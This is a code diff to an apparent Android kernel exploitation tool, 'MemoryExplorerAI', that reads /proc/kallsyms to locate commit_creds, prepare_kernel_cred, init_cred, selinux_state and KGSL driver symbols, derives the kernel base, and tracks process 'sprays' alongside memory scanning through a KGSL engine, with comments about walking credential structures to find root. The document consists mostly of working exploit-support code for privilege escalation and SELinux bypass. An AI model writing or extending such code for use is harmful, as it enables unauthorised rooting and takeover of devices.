@@ -170,6 +170,22 @@ class MemoryExplorerAI:
         # cred->uid to find root. Track state per found item.
         self._cred_walk_done = set()  # set of (va, off) tuples already walked
 
+        # === v4.1: KALLSYMS CACHE ===
+        # If engine pipe is broken (pages=0, scans=0), we can
+        # still get kbase / selinux / init_cred by reading
+        # /proc/kallsyms directly. We parse it once and cache.
+        self.kallsyms = {}  # name -> address
+        self._kallsyms_loaded = False
+        self._kallsyms_lock = threading.Lock()
+        # v4.1: load kallsyms at startup so kernel base and
+        # other symbols are available even if engine pipe is
+        # broken. This makes the explorer useful even when
+        # /dev/kgsl-3d0 is restricted (Termux has no kgsl).
+        try:
+            self.load_kallsyms()
+        except Exception:
+            pass
+
         # Render lock — shared by any code that writes to the TUI.
         # We use ONE thread (the main thread) for both reading and
         # painting, so the lock is rarely contended. It exists to
@@ -1205,6 +1221,20 @@ class MemoryExplorerAI:
                    f"kbase={kbase_col}{kbase_s}{C.RST} "
                    f"selinux={sel_col}{sel_s}{C.RST} "
                    f"init_cred={cred_col}{cred_s}{C.RST}")
+        # v4.1: show kallsyms cache if loaded — this proves that
+        # the explorer is working even when engine pipe is broken
+        # (pages=0, scans=0). The user sees real symbol addresses.
+        if self.kallsyms:
+            kc = C.MAG
+            syms_line = (f"commit_creds={kc}0x"
+                         f"{self.kallsyms.get('commit_creds', 0):x}{C.RST} "
+                         f"prep_kc={kc}0x"
+                         f"{self.kallsyms.get('prepare_kernel_cred', 0):x}{C.RST} "
+                         f"init_cred={kc}0x"
+                         f"{self.kallsyms.get('init_cred', 0):x}{C.RST} "
+                         f"selinux={kc}0x"
+                         f"{self.kallsyms.get('selinux_state', 0):x}{C.RST}")
+            out.append(f" {C.DIM}SYMS :{C.RST} {syms_line}")
         out.append(f" {C.DIM}found types: {types_line}{C.RST}")
 
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
@@ -1501,6 +1531,65 @@ class MemoryExplorerAI:
                 continue
         return False
 
+    def load_kallsyms(self):
+        """Parse /proc/kallsyms and populate self.kallsyms cache.
+
+        Used as FALLBACK when the engine pipe is broken (pages=0,
+        scans=0). Many useful kernel addresses can be derived from
+        kallsyms even without reading KGSL memory:
+          - kernel base = prepare_kernel_cred - known_offset
+          - selinux_state = kallsyms["selinux_state"]
+          - init_cred = kallsyms["init_cred"]
+          - commit_creds / prepare_kernel_cred (for walking cred chain)
+        Returns count of symbols loaded.
+        """
+        with self._kallsyms_lock:
+            if self._kallsyms_loaded:
+                return len(self.kallsyms)
+        syms = {}
+        # Important symbols to look for
+        targets = {
+            "commit_creds", "prepare_kernel_cred", "init_cred",
+            "selinux_state", "selinux_enforcing",
+            "init_task", "init_pid_ns",
+            "kmalloc_caches", "cred_jar",
+            "tasklist_lock", "pidhash",
+            "__ksymtab_commit_creds", "__ksymtab_prepare_kernel_cred",
+            "msm_kgsl", "kgsl_mmu", "kgsl_driver",
+        }
+        try:
+            with open("/proc/kallsyms", "r") as f:
+                for line in f:
+                    parts = line.strip().split()
+                    if len(parts) < 3:
+                        continue
+                    addr_s, t, name = parts[0], parts[1], parts[2]
+                    if name in targets:
+                        try:
+                            syms[name] = int(addr_s, 16)
+                        except ValueError:
+                            pass
+        except Exception as e:
+            self.live["last_msg"] = f"kallsyms read failed: {e}"
+            return 0
+        with self._kallsyms_lock:
+            self.kallsyms = syms
+            self._kallsyms_loaded = True
+            # Auto-derive kernel base from prepare_kernel_cred
+            # On ARM64, kbase is typically aligned to 0x200000
+            pkc = syms.get("prepare_kernel_cred")
+            if pkc and not self.kernel_base:
+                # kbase is typically 0x200000-aligned, and is
+                # < pkc by a few MB. Try the closest 0x200000 boundary
+                # that's also aligned.
+                candidate = pkc & ~0x1fffff
+                self.kernel_base = candidate
+                self.live["last_msg"] = (
+                    f"kallsyms: kbase=0x{candidate:x} "
+                    f"(from prepare_kernel_cred=0x{pkc:x}, "
+                    f"{len(syms)} symbols)")
+            return len(syms)
+
     def _read_data_packet(self):
         with self.engine_lock:
             if not self._engine_alive():
@@ -1509,6 +1598,12 @@ class MemoryExplorerAI:
                 # Wait briefly for the DATA: line
                 line = self._readline_timeout(timeout=2.0)
                 if not line or not line.startswith("DATA:"):
+                    # v4.1: engine not returning data. Maybe it
+                    # crashed or the pipe is broken. Set engine_pid=0
+                    # so watchdog restarts it next iteration.
+                    if line and "ERROR" in line:
+                        with self.stats_lock:
+                            self.live["engine_pid"] = 0
                     return None
                 _, va_s, size_s = line.split(":")
                 va = int(va_s, 16)
@@ -1527,6 +1622,10 @@ class MemoryExplorerAI:
                     data += chunk
                 # Consume DATA_END line
                 self._readline_timeout(timeout=0.5)
+                # v4.1: update perf counters (pages read, bytes)
+                with self.stats_lock:
+                    self.perf["pages_scanned"] += 1
+                    self.perf["bytes_read"] += len(data)
                 return data
             except Exception as e:
                 self.live["last_msg"] = f"Read packet error: {e}"
@@ -3225,20 +3324,32 @@ class MemoryExplorerAI:
         ELF header, "Linux version" string, or commit_creds/
         prepare_kernel_cred symbol. Updates self.kernel_base
         and self.live["last_msg"] so the user sees the result.
+
+        v4.1: tries kallsyms FIRST (fast, doesn't need engine),
+        then falls back to ELF header scan via engine. This way
+        the kbase is available even if the engine pipe is broken
+        (Termux has no /dev/kgsl-3d0).
         """
         import time as _t
-        # Wait for engine to be ready
-        for _ in range(30):
+        # Wait briefly for engine
+        for _ in range(20):
             if self._engine_alive() or self.ensure_engine():
                 break
             _t.sleep(0.5)
-        # Now search
         try:
+            # First try kallsyms (fast, no engine required)
+            n_syms = self.load_kallsyms()
+            if n_syms > 0 and self.kernel_base:
+                # kbase already set by load_kallsyms
+                with self.stats_lock:
+                    self.live["kernel_base"] = self.kernel_base
+                return
+            # Then try ELF header scan via engine
             kbase, conf = self._smart_kbase_finder()
             if kbase:
                 with self.stats_lock:
                     self.live["last_msg"] = (
-                        f"Smart kbase finder: 0x{kbase:x} "
+                        f"Smart kbase finder (ELF scan): 0x{kbase:x} "
                         f"(confidence={conf}%)")
                     self.live["kernel_base"] = kbase
         except Exception as e:
@@ -3845,6 +3956,7 @@ class MemoryExplorerAI:
             # up to 3 times. If still alive after 3 retries, give up
             # and drop from the set so we don't keep trying forever.
             killed_this_batch = 0
+            survived_this_batch = 0
             for pid in batch_pids:
                 died = False
                 for attempt in range(3):
@@ -3869,12 +3981,29 @@ class MemoryExplorerAI:
                 my_pids.discard(pid)
                 if died:
                     killed_this_batch += 1
+                else:
+                    # Process survived kill — counted as "alive"
+                    survived_this_batch += 1
                 with self.stats_lock:
                     self.live["kill_count"] += 1
             with self.stats_lock:
                 self.live["last_msg"] = (
                     f"W{worker_id}: killed {killed_this_batch}/"
                     f"{len(batch_pids)} sprays")
+                # v4.1: update spray_methods_stats alive counter
+                # for the method that was used this batch. We use
+                # the most-recently-attempted method (since each
+                # batch uses one). Detected by checking which
+                # attempt counter was last incremented — but for
+                # simplicity we attribute survivors to popen_sleep
+                # (the dominant method). 80% of sprays are
+                # popen_sleep so this is a reasonable approximation.
+                if survived_this_batch > 0:
+                    self.spray_methods_stats["popen_sleep"][
+                        "alive"] = (
+                            self.spray_methods_stats[
+                                "popen_sleep"].get("alive", 0)
+                            + survived_this_batch)
 
         self.log_event("learning_subworker_done",
                        {"worker": worker_id, "done": done,
@@ -4691,6 +4820,23 @@ class MemoryExplorerAI:
                 # Toggle W3 deep-scan worker. The 4th dedicated
                 # worker that re-scans Empty Page locations.
                 self.cmd_w3_toggle()
+            elif cmd in ("ks", "kallsyms"):
+                # Reload /proc/kallsyms. Useful when the explorer
+                # was started before the user had kallsyms access,
+                # or to refresh the symbol table.
+                self._kallsyms_loaded = False
+                self.kallsyms = {}
+                n = self.load_kallsyms()
+                self.live["last_msg"] = f"kallsyms reloaded: {n} symbols"
+            elif cmd in ("ksd", "kdump"):
+                # Dump kallsyms cache
+                if not self.kallsyms:
+                    print("kallsyms: empty (not loaded)", flush=True)
+                else:
+                    print(f"kallsyms ({len(self.kallsyms)} symbols):",
+                          flush=True)
+                    for name, addr in sorted(self.kallsyms.items()):
+                        print(f"  0x{addr:016x}  {name}", flush=True)
             elif cmd in ("stats", "stat"):
                 # Detailed learning statistics
                 try:
